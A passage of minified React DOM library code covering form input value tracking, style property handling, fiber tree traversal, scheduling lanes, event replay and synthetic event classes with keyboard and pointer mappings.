      Object.defineProperty(e, t, { enumerable: n.enumerable }),
      {
        getValue: function () {
          return r;
        },
        setValue: function (o) {
          r = "" + o;
        },
        stopTracking: function () {
          (e._valueTracker = null), delete e[t];
        },
      }
    );
  }
}
function Ar(e) {
  e._valueTracker || (e._valueTracker = Ad(e));
}
function sa(e) {
  if (!e) return !1;
  var t = e._valueTracker;
  if (!t) return !0;
  var n = t.getValue(),
    r = "";
  return (
    e && (r = ua(e) ? (e.checked ? "true" : "false") : e.value),
    (e = r),
    e !== n ? (t.setValue(e), !0) : !1
  );
}
function Wr(e) {
  if (((e = e || (typeof document < "u" ? document : void 0)), typeof e > "u"))
    return null;
  try {
    return e.activeElement || e.body;
  } catch {
    return e.body;
  }
}
function vi(e, t) {
  var n = t.checked;
  return W({}, t, {
    defaultChecked: void 0,
    defaultValue: void 0,
    value: void 0,
    checked: n ?? e._wrapperState.initialChecked,
  });
}
function yu(e, t) {
  var n = t.defaultValue == null ? "" : t.defaultValue,
    r = t.checked != null ? t.checked : t.defaultChecked;
  (n = ht(t.value != null ? t.value : n)),
    (e._wrapperState = {
      initialChecked: r,
      initialValue: n,
      controlled:
        t.type === "checkbox" || t.type === "radio"
          ? t.checked != null
          : t.value != null,
    });
}
function aa(e, t) {
  (t = t.checked), t != null && vo(e, "checked", t, !1);
}
function yi(e, t) {
  aa(e, t);
  var n = ht(t.value),
    r = t.type;
  if (n != null)
    r === "number"
      ? ((n === 0 && e.value === "") || e.value != n) && (e.value = "" + n)
      : e.value !== "" + n && (e.value = "" + n);
  else if (r === "submit" || r === "reset") {
    e.removeAttribute("value");
    return;
  }
  t.hasOwnProperty("value")
    ? wi(e, t.type, n)
    : t.hasOwnProperty("defaultValue") && wi(e, t.type, ht(t.defaultValue)),
    t.checked == null &&
      t.defaultChecked != null &&
      (e.defaultChecked = !!t.defaultChecked);
}
function wu(e, t, n) {
  if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
    var r = t.type;
    if (
      !(
        (r !== "submit" && r !== "reset") ||
        (t.value !== void 0 && t.value !== null)
      )
    )
      return;
    (t = "" + e._wrapperState.initialValue),
      n || t === e.value || (e.value = t),
      (e.defaultValue = t);
  }
  (n = e.name),
    n !== "" && (e.name = ""),
    (e.defaultChecked = !!e._wrapperState.initialChecked),
    n !== "" && (e.name = n);
}
function wi(e, t, n) {
  (t !== "number" || Wr(e.ownerDocument) !== e) &&
    (n == null
      ? (e.defaultValue = "" + e._wrapperState.initialValue)
      : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
}
var Nn = Array.isArray;
function Yt(e, t, n, r) {
  if (((e = e.options), t)) {
    t = {};
    for (var l = 0; l < n.length; l++) t["$" + n[l]] = !0;
    for (n = 0; n < e.length; n++)
      (l = t.hasOwnProperty("$" + e[n].value)),
        e[n].selected !== l && (e[n].selected = l),
        l && r && (e[n].defaultSelected = !0);
  } else {
    for (n = "" + ht(n), t = null, l = 0; l < e.length; l++) {
      if (e[l].value === n) {
        (e[l].selected = !0), r && (e[l].defaultSelected = !0);
        return;
      }
      t !== null || e[l].disabled || (t = e[l]);
    }
    t !== null && (t.selected = !0);
  }
}
function Si(e, t) {
  if (t.dangerouslySetInnerHTML != null) throw Error(x(91));
  return W({}, t, {
    value: void 0,
    defaultValue: void 0,
    children: "" + e._wrapperState.initialValue,
  });
}
function Su(e, t) {
  var n = t.value;
  if (n == null) {
    if (((n = t.children), (t = t.defaultValue), n != null)) {
      if (t != null) throw Error(x(92));
      if (Nn(n)) {
        if (1 < n.length) throw Error(x(93));
        n = n[0];
      }
      t = n;
    }
    t == null && (t = ""), (n = t);
  }
  e._wrapperState = { initialValue: ht(n) };
}
function ca(e, t) {
  var n = ht(t.value),
    r = ht(t.defaultValue);
  n != null &&
    ((n = "" + n),
    n !== e.value && (e.value = n),
    t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)),
    r != null && (e.defaultValue = "" + r);
}
function xu(e) {
  var t = e.textContent;
  t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t);
}
function fa(e) {
  switch (e) {
    case "svg":
      return "http://www.w3.org/2000/svg";
    case "math":
      return "http://www.w3.org/1998/Math/MathML";
    default:
      return "http://www.w3.org/1999/xhtml";
  }
}
function xi(e, t) {
  return e == null || e === "http://www.w3.org/1999/xhtml"
    ? fa(t)
    : e === "http://www.w3.org/2000/svg" && t === "foreignObject"
    ? "http://www.w3.org/1999/xhtml"
    : e;
}
var hr,
  da = (function (e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction
      ? function (t, n, r, l) {
          MSApp.execUnsafeLocalFunction(function () {
            return e(t, n, r, l);
          });
        }
      : e;
  })(function (e, t) {
    if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e)
      e.innerHTML = t;
    else {
      for (
        hr = hr || document.createElement("div"),
          hr.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>",
          t = hr.firstChild;
        e.firstChild;

      )
        e.removeChild(e.firstChild);
      for (; t.firstChild; ) e.appendChild(t.firstChild);
    }
  });
function Dn(e, t) {
  if (t) {
    var n = e.firstChild;
    if (n && n === e.lastChild && n.nodeType === 3) {
      n.nodeValue = t;
      return;
    }
  }
  e.textContent = t;
}
var Ln = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0,
  },
  hd = ["Webkit", "ms", "Moz", "O"];
Object.keys(Ln).forEach(function (e) {
  hd.forEach(function (t) {
    (t = t + e.charAt(0).toUpperCase() + e.substring(1)), (Ln[t] = Ln[e]);
  });
});
function pa(e, t, n) {
  return t == null || typeof t == "boolean" || t === ""
    ? ""
    : n || typeof t != "number" || t === 0 || (Ln.hasOwnProperty(e) && Ln[e])
    ? ("" + t).trim()
    : t + "px";
}
function Aa(e, t) {
  e = e.style;
  for (var n in t)
    if (t.hasOwnProperty(n)) {
      var r = n.indexOf("--") === 0,
        l = pa(n, t[n], r);
      n === "float" && (n = "cssFloat"), r ? e.setProperty(n, l) : (e[n] = l);
    }
}
var md = W(
  { menuitem: !0 },
  {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0,
  }
);
function Ei(e, t) {
  if (t) {
    if (md[e] && (t.children != null || t.dangerouslySetInnerHTML != null))
      throw Error(x(137, e));
    if (t.dangerouslySetInnerHTML != null) {
      if (t.children != null) throw Error(x(60));
      if (
        typeof t.dangerouslySetInnerHTML != "object" ||
        !("__html" in t.dangerouslySetInnerHTML)
      )
        throw Error(x(61));
    }
    if (t.style != null && typeof t.style != "object") throw Error(x(62));
  }
}
function ki(e, t) {
  if (e.indexOf("-") === -1) return typeof t.is == "string";
  switch (e) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
      return !1;
    default:
      return !0;
  }
}
var Ci = null;
function xo(e) {
  return (
    (e = e.target || e.srcElement || window),
    e.correspondingUseElement && (e = e.correspondingUseElement),
    e.nodeType === 3 ? e.parentNode : e
  );
}
var Pi = null,
  Zt = null,
  bt = null;
function Eu(e) {
  if ((e = ur(e))) {
    if (typeof Pi != "function") throw Error(x(280));
    var t = e.stateNode;
    t && ((t = Sl(t)), Pi(e.stateNode, e.type, t));
  }
}
function ha(e) {
  Zt ? (bt ? bt.push(e) : (bt = [e])) : (Zt = e);
}
function ma() {
  if (Zt) {
    var e = Zt,
      t = bt;
    if (((bt = Zt = null), Eu(e), t)) for (e = 0; e < t.length; e++) Eu(t[e]);
  }
}
function ga(e, t) {
  return e(t);
}
function va() {}
var Wl = !1;
function ya(e, t, n) {
  if (Wl) return e(t, n);
  Wl = !0;
  try {
    return ga(e, t, n);
  } finally {
    (Wl = !1), (Zt !== null || bt !== null) && (va(), ma());
  }
}
function Kn(e, t) {
  var n = e.stateNode;
  if (n === null) return null;
  var r = Sl(n);
  if (r === null) return null;
  n = r[t];
  e: switch (t) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
      (r = !r.disabled) ||
        ((e = e.type),
        (r = !(
          e === "button" ||
          e === "input" ||
          e === "select" ||
          e === "textarea"
        ))),
        (e = !r);
      break e;
    default:
      e = !1;
  }
  if (e) return null;
  if (n && typeof n != "function") throw Error(x(231, t, typeof n));
  return n;
}
var Ni = !1;
if (qe)
  try {
    var gn = {};
    Object.defineProperty(gn, "passive", {
      get: function () {
        Ni = !0;
      },
    }),
      window.addEventListener("test", gn, gn),
      window.removeEventListener("test", gn, gn);
  } catch {
    Ni = !1;
  }
function gd(e, t, n, r, l, i, o, u, s) {
  var a = Array.prototype.slice.call(arguments, 3);
  try {
    t.apply(n, a);
  } catch (p) {
    this.onError(p);
  }
}
var Un = !1,
  Xr = null,
  Hr = !1,
  ji = null,
  vd = {
    onError: function (e) {
      (Un = !0), (Xr = e);
    },
  };
function yd(e, t, n, r, l, i, o, u, s) {
  (Un = !1), (Xr = null), gd.apply(vd, arguments);
}
function wd(e, t, n, r, l, i, o, u, s) {
  if ((yd.apply(this, arguments), Un)) {
    if (Un) {
      var a = Xr;
      (Un = !1), (Xr = null);
    } else throw Error(x(198));
    Hr || ((Hr = !0), (ji = a));
  }
}
function Ot(e) {
  var t = e,
    n = e;
  if (e.alternate) for (; t.return; ) t = t.return;
  else {
    e = t;
    do (t = e), t.flags & 4098 && (n = t.return), (e = t.return);
    while (e);
  }
  return t.tag === 3 ? n : null;
}
function wa(e) {
  if (e.tag === 13) {
    var t = e.memoizedState;
    if (
      (t === null && ((e = e.alternate), e !== null && (t = e.memoizedState)),
      t !== null)
    )
      return t.dehydrated;
  }
  return null;
}
function ku(e) {
  if (Ot(e) !== e) throw Error(x(188));
}
function Sd(e) {
  var t = e.alternate;
  if (!t) {
    if (((t = Ot(e)), t === null)) throw Error(x(188));
    return t !== e ? null : e;
  }
  for (var n = e, r = t; ; ) {
    var l = n.return;
    if (l === null) break;
    var i = l.alternate;
    if (i === null) {
      if (((r = l.return), r !== null)) {
        n = r;
        continue;
      }
      break;
    }
    if (l.child === i.child) {
      for (i = l.child; i; ) {
        if (i === n) return ku(l), e;
        if (i === r) return ku(l), t;
        i = i.sibling;
      }
      throw Error(x(188));
    }
    if (n.return !== r.return) (n = l), (r = i);
    else {
      for (var o = !1, u = l.child; u; ) {
        if (u === n) {
          (o = !0), (n = l), (r = i);
          break;
        }
        if (u === r) {
          (o = !0), (r = l), (n = i);
          break;
        }
        u = u.sibling;
      }
      if (!o) {
        for (u = i.child; u; ) {
          if (u === n) {
            (o = !0), (n = i), (r = l);
            break;
          }
          if (u === r) {
            (o = !0), (r = i), (n = l);
            break;
          }
          u = u.sibling;
        }
        if (!o) throw Error(x(189));
      }
    }
    if (n.alternate !== r) throw Error(x(190));
  }
  if (n.tag !== 3) throw Error(x(188));
  return n.stateNode.current === n ? e : t;
}
function Sa(e) {
  return (e = Sd(e)), e !== null ? xa(e) : null;
}
function xa(e) {
  if (e.tag === 5 || e.tag === 6) return e;
  for (e = e.child; e !== null; ) {
    var t = xa(e);
    if (t !== null) return t;
    e = e.sibling;
  }
  return null;
}
var Ea = Se.unstable_scheduleCallback,
  Cu = Se.unstable_cancelCallback,
  xd = Se.unstable_shouldYield,
  Ed = Se.unstable_requestPaint,
  J = Se.unstable_now,
  kd = Se.unstable_getCurrentPriorityLevel,
  Eo = Se.unstable_ImmediatePriority,
  ka = Se.unstable_UserBlockingPriority,
  Jr = Se.unstable_NormalPriority,
  Cd = Se.unstable_LowPriority,
  Ca = Se.unstable_IdlePriority,
  gl = null,
  De = null;
function Pd(e) {
  if (De && typeof De.onCommitFiberRoot == "function")
    try {
      De.onCommitFiberRoot(gl, e, void 0, (e.current.flags & 128) === 128);
    } catch {}
}
var Oe = Math.clz32 ? Math.clz32 : Td,
  Nd = Math.log,
  jd = Math.LN2;
function Td(e) {
  return (e >>>= 0), e === 0 ? 32 : (31 - ((Nd(e) / jd) | 0)) | 0;
}
var mr = 64,
  gr = 4194304;
function jn(e) {
  switch (e & -e) {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 4;
    case 8:
      return 8;
    case 16:
      return 16;
    case 32:
      return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return e & 4194240;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return e & 130023424;
    case 134217728:
      return 134217728;
    case 268435456:
      return 268435456;
    case 536870912:
      return 536870912;
    case 1073741824:
      return 1073741824;
    default:
      return e;
  }
}
function Gr(e, t) {
  var n = e.pendingLanes;
  if (n === 0) return 0;
  var r = 0,
    l = e.suspendedLanes,
    i = e.pingedLanes,
    o = n & 268435455;
  if (o !== 0) {
    var u = o & ~l;
    u !== 0 ? (r = jn(u)) : ((i &= o), i !== 0 && (r = jn(i)));
  } else (o = n & ~l), o !== 0 ? (r = jn(o)) : i !== 0 && (r = jn(i));
  if (r === 0) return 0;
  if (
    t !== 0 &&
    t !== r &&
    !(t & l) &&
    ((l = r & -r), (i = t & -t), l >= i || (l === 16 && (i & 4194240) !== 0))
  )
    return t;
  if ((r & 4 && (r |= n & 16), (t = e.entangledLanes), t !== 0))
    for (e = e.entanglements, t &= r; 0 < t; )
      (n = 31 - Oe(t)), (l = 1 << n), (r |= e[n]), (t &= ~l);
  return r;
}
function Ld(e, t) {
  switch (e) {
    case 1:
    case 2:
    case 4:
      return t + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return t + 5e3;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return -1;
    case 134217728:
    case 268435456:
    case 536870912:
    case 1073741824:
      return -1;
    default:
      return -1;
  }
}
function Ud(e, t) {
  for (
    var n = e.suspendedLanes,
      r = e.pingedLanes,
      l = e.expirationTimes,
      i = e.pendingLanes;
    0 < i;

  ) {
    var o = 31 - Oe(i),
      u = 1 << o,
      s = l[o];
    s === -1
      ? (!(u & n) || u & r) && (l[o] = Ld(u, t))
      : s <= t && (e.expiredLanes |= u),
      (i &= ~u);
  }
}
function Ti(e) {
  return (
    (e = e.pendingLanes & -1073741825),
    e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
  );
}
function Pa() {
  var e = mr;
  return (mr <<= 1), !(mr & 4194240) && (mr = 64), e;
}
function Xl(e) {
  for (var t = [], n = 0; 31 > n; n++) t.push(e);
  return t;
}
function ir(e, t, n) {
  (e.pendingLanes |= t),
    t !== 536870912 && ((e.suspendedLanes = 0), (e.pingedLanes = 0)),
    (e = e.eventTimes),
    (t = 31 - Oe(t)),
    (e[t] = n);
}
function Id(e, t) {
  var n = e.pendingLanes & ~t;
  (e.pendingLanes = t),
    (e.suspendedLanes = 0),
    (e.pingedLanes = 0),
    (e.expiredLanes &= t),
    (e.mutableReadLanes &= t),
    (e.entangledLanes &= t),
    (t = e.entanglements);
  var r = e.eventTimes;
  for (e = e.expirationTimes; 0 < n; ) {
    var l = 31 - Oe(n),
      i = 1 << l;
    (t[l] = 0), (r[l] = -1), (e[l] = -1), (n &= ~i);
  }
}
function ko(e, t) {
  var n = (e.entangledLanes |= t);
  for (e = e.entanglements; n; ) {
    var r = 31 - Oe(n),
      l = 1 << r;
    (l & t) | (e[r] & t) && (e[r] |= t), (n &= ~l);
  }
}
var O = 0;
function Na(e) {
  return (e &= -e), 1 < e ? (4 < e ? (e & 268435455 ? 16 : 536870912) : 4) : 1;
}
var ja,
  Co,
  Ta,
  La,
  Ua,
  Li = !1,
  vr = [],
  ut = null,
  st = null,
  at = null,
  Wn = new Map(),
  Xn = new Map(),
  nt = [],
  zd =
    "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
      " "
    );
function Pu(e, t) {
  switch (e) {
    case "focusin":
    case "focusout":
      ut = null;
      break;
    case "dragenter":
    case "dragleave":
      st = null;
      break;
    case "mouseover":
    case "mouseout":
      at = null;
      break;
    case "pointerover":
    case "pointerout":
      Wn.delete(t.pointerId);
      break;
    case "gotpointercapture":
    case "lostpointercapture":
      Xn.delete(t.pointerId);
  }
}
function vn(e, t, n, r, l, i) {
  return e === null || e.nativeEvent !== i
    ? ((e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: i,
        targetContainers: [l],
      }),
      t !== null && ((t = ur(t)), t !== null && Co(t)),
      e)
    : ((e.eventSystemFlags |= r),
      (t = e.targetContainers),
      l !== null && t.indexOf(l) === -1 && t.push(l),
      e);
}
function Rd(e, t, n, r, l) {
  switch (t) {
    case "focusin":
      return (ut = vn(ut, e, t, n, r, l)), !0;
    case "dragenter":
      return (st = vn(st, e, t, n, r, l)), !0;
    case "mouseover":
      return (at = vn(at, e, t, n, r, l)), !0;
    case "pointerover":
      var i = l.pointerId;
      return Wn.set(i, vn(Wn.get(i) || null, e, t, n, r, l)), !0;
    case "gotpointercapture":
      return (
        (i = l.pointerId), Xn.set(i, vn(Xn.get(i) || null, e, t, n, r, l)), !0
      );
  }
  return !1;
}
function Ia(e) {
  var t = kt(e.target);
  if (t !== null) {
    var n = Ot(t);
    if (n !== null) {
      if (((t = n.tag), t === 13)) {
        if (((t = wa(n)), t !== null)) {
          (e.blockedOn = t),
            Ua(e.priority, function () {
              Ta(n);
            });
          return;
        }
      } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
        e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
        return;
      }
    }
  }
  e.blockedOn = null;
}
function Ur(e) {
  if (e.blockedOn !== null) return !1;
  for (var t = e.targetContainers; 0 < t.length; ) {
    var n = Ui(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
    if (n === null) {
      n = e.nativeEvent;
      var r = new n.constructor(n.type, n);
      (Ci = r), n.target.dispatchEvent(r), (Ci = null);
    } else return (t = ur(n)), t !== null && Co(t), (e.blockedOn = n), !1;
    t.shift();
  }
  return !0;
}
function Nu(e, t, n) {
  Ur(e) && n.delete(t);
}
function Od() {
  (Li = !1),
    ut !== null && Ur(ut) && (ut = null),
    st !== null && Ur(st) && (st = null),
    at !== null && Ur(at) && (at = null),
    Wn.forEach(Nu),
    Xn.forEach(Nu);
}
function yn(e, t) {
  e.blockedOn === t &&
    ((e.blockedOn = null),
    Li ||
      ((Li = !0),
      Se.unstable_scheduleCallback(Se.unstable_NormalPriority, Od)));
}
function Hn(e) {
  function t(l) {
    return yn(l, e);
  }
  if (0 < vr.length) {
    yn(vr[0], e);
    for (var n = 1; n < vr.length; n++) {
      var r = vr[n];
      r.blockedOn === e && (r.blockedOn = null);
    }
  }
  for (
    ut !== null && yn(ut, e),
      st !== null && yn(st, e),
      at !== null && yn(at, e),
      Wn.forEach(t),
      Xn.forEach(t),
      n = 0;
    n < nt.length;
    n++
  )
    (r = nt[n]), r.blockedOn === e && (r.blockedOn = null);
  for (; 0 < nt.length && ((n = nt[0]), n.blockedOn === null); )
    Ia(n), n.blockedOn === null && nt.shift();
}
var _t = _e.ReactCurrentBatchConfig,
  qr = !0;
function Md(e, t, n, r) {
  var l = O,
    i = _t.transition;
  _t.transition = null;
  try {
    (O = 1), Po(e, t, n, r);
  } finally {
    (O = l), (_t.transition = i);
  }
}
function Fd(e, t, n, r) {
  var l = O,
    i = _t.transition;
  _t.transition = null;
  try {
    (O = 4), Po(e, t, n, r);
  } finally {
    (O = l), (_t.transition = i);
  }
}
function Po(e, t, n, r) {
  if (qr) {
    var l = Ui(e, t, n, r);
    if (l === null) ei(e, t, r, Yr, n), Pu(e, r);
    else if (Rd(l, e, t, n, r)) r.stopPropagation();
    else if ((Pu(e, r), t & 4 && -1 < zd.indexOf(e))) {
      for (; l !== null; ) {
        var i = ur(l);
        if (
          (i !== null && ja(i),
          (i = Ui(e, t, n, r)),
          i === null && ei(e, t, r, Yr, n),
          i === l)
        )
          break;
        l = i;
      }
      l !== null && r.stopPropagation();
    } else ei(e, t, r, null, n);
  }
}
var Yr = null;
function Ui(e, t, n, r) {
  if (((Yr = null), (e = xo(r)), (e = kt(e)), e !== null))
    if (((t = Ot(e)), t === null)) e = null;
    else if (((n = t.tag), n === 13)) {
      if (((e = wa(t)), e !== null)) return e;
      e = null;
    } else if (n === 3) {
      if (t.stateNode.current.memoizedState.isDehydrated)
        return t.tag === 3 ? t.stateNode.containerInfo : null;
      e = null;
    } else t !== e && (e = null);
  return (Yr = e), null;
}
function za(e) {
  switch (e) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
      return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
      return 4;
    case "message":
      switch (kd()) {
        case Eo:
          return 1;
        case ka:
          return 4;
        case Jr:
        case Cd:
          return 16;
        case Ca:
          return 536870912;
        default:
          return 16;
      }
    default:
      return 16;
  }
}
var lt = null,
  No = null,
  Ir = null;
function Ra() {
  if (Ir) return Ir;
  var e,
    t = No,
    n = t.length,
    r,
    l = "value" in lt ? lt.value : lt.textContent,
    i = l.length;
  for (e = 0; e < n && t[e] === l[e]; e++);
  var o = n - e;
  for (r = 1; r <= o && t[n - r] === l[i - r]; r++);
  return (Ir = l.slice(e, 1 < r ? 1 - r : void 0));
}
function zr(e) {
  var t = e.keyCode;
  return (
    "charCode" in e
      ? ((e = e.charCode), e === 0 && t === 13 && (e = 13))
      : (e = t),
    e === 10 && (e = 13),
    32 <= e || e === 13 ? e : 0
  );
}
function yr() {
  return !0;
}
function ju() {
  return !1;
}
function Ee(e) {
  function t(n, r, l, i, o) {
    (this._reactName = n),
      (this._targetInst = l),
      (this.type = r),
      (this.nativeEvent = i),
      (this.target = o),
      (this.currentTarget = null);
    for (var u in e)
      e.hasOwnProperty(u) && ((n = e[u]), (this[u] = n ? n(i) : i[u]));
    return (
      (this.isDefaultPrevented = (
        i.defaultPrevented != null ? i.defaultPrevented : i.returnValue === !1
      )
        ? yr
        : ju),
      (this.isPropagationStopped = ju),
      this
    );
  }
  return (
    W(t.prototype, {
      preventDefault: function () {
        this.defaultPrevented = !0;
        var n = this.nativeEvent;
        n &&
          (n.preventDefault
            ? n.preventDefault()
            : typeof n.returnValue != "unknown" && (n.returnValue = !1),
          (this.isDefaultPrevented = yr));
      },
      stopPropagation: function () {
        var n = this.nativeEvent;
        n &&
          (n.stopPropagation
            ? n.stopPropagation()
            : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
          (this.isPropagationStopped = yr));
      },
      persist: function () {},
      isPersistent: yr,
    }),
    t
  );
}
var dn = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function (e) {
      return e.timeStamp || Date.now();
    },
    defaultPrevented: 0,
    isTrusted: 0,
  },
  jo = Ee(dn),
  or = W({}, dn, { view: 0, detail: 0 }),
  Bd = Ee(or),
  Hl,
  Jl,
  wn,
  vl = W({}, or, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: To,
    button: 0,
    buttons: 0,
    relatedTarget: function (e) {
      return e.relatedTarget === void 0
        ? e.fromElement === e.srcElement
          ? e.toElement
          : e.fromElement
        : e.relatedTarget;
    },
    movementX: function (e) {
      return "movementX" in e
        ? e.movementX
        : (e !== wn &&
            (wn && e.type === "mousemove"
              ? ((Hl = e.screenX - wn.screenX), (Jl = e.screenY - wn.screenY))
              : (Jl = Hl = 0),
            (wn = e)),
          Hl);
    },
    movementY: function (e) {
      return "movementY" in e ? e.movementY : Jl;
    },
  }),
  Tu = Ee(vl),
  Vd = W({}, vl, { dataTransfer: 0 }),
  Qd = Ee(Vd),
  Dd = W({}, or, { relatedTarget: 0 }),
  Gl = Ee(Dd),
  Kd = W({}, dn, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
  Wd = Ee(Kd),
  Xd = W({}, dn, {
    clipboardData: function (e) {
      return "clipboardData" in e ? e.clipboardData : window.clipboardData;
    },
  }),
  Hd = Ee(Xd),
  Jd = W({}, dn, { data: 0 }),
  Lu = Ee(Jd),
  Gd = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified",
  },
  qd = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta",
  },
  Yd = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey",
  };
function Zd(e) {
  var t = this.nativeEvent;
  return t.getModifierState ? t.getModifierState(e) : (e = Yd[e]) ? !!t[e] : !1;
}
function To() {
  return Zd;
}
var bd = W({}, or, {
    key: function (e) {
      if (e.key) {
        var t = Gd[e.key] || e.key;
        if (t !== "Unidentified") return t;
      }
      return e.type === "keypress"
        ? ((e = zr(e)), e === 13 ? "Enter" : String.fromCharCode(e))
        : e.type === "keydown" || e.type === "keyup"
        ? qd[e.keyCode] || "Unidentified"
        : "";
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: To,
    charCode: function (e) {
      return e.type === "keypress" ? zr(e) : 0;
    },
    keyCode: function (e) {
      return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0;
    },
    which: function (e) {
      return e.type === "keypress"
        ? zr(e)
        : e.type === "keydown" || e.type === "keyup"
        ? e.keyCode
        : 0;
    },
  }),
  _d = Ee(bd),
  $d = W({}, vl, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0,
  }),
  Uu = Ee($d),
  ep = W({}, or, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: To,
  }),
  tp = Ee(ep),
  np = W({}, dn, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
  rp = Ee(np),
  lp = W({}, vl, {
    deltaX: function (e) {
      return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
    },
    deltaY: function (e) {
      return "deltaY" in e
        ? e.deltaY
        : "wheelDeltaY" in e
        ? -e.wheelDeltaY
